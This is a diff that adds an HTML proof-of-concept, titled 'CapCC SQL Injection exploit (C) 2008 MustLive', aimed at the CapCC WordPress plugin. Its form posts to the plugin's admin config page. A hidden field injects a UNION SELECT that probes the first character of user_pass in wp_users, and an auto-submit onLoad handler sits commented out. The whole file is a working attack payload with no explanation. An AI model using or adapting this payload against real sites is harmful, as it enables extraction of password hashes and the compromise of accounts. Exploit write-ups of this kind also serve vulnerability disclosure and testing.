@@ -1,0 +1,11 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;CapCC SQL Injection exploit (C) 2008 MustLive. http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;!-- &lt;body onLoad=&quot;document.hack.submit()&quot;&gt; --&gt;
+&lt;body&gt;
+&lt;form name=&quot;hack&quot; action=&quot;http://site/wp-admin/plugins.php?page=capcc-config&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;CAPCC_MAX_ATTEMPTS&quot; value=&quot;5 union select 1,null,null,null,null from wp_users where substring(user_pass,1,1)&gt;char(48)&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
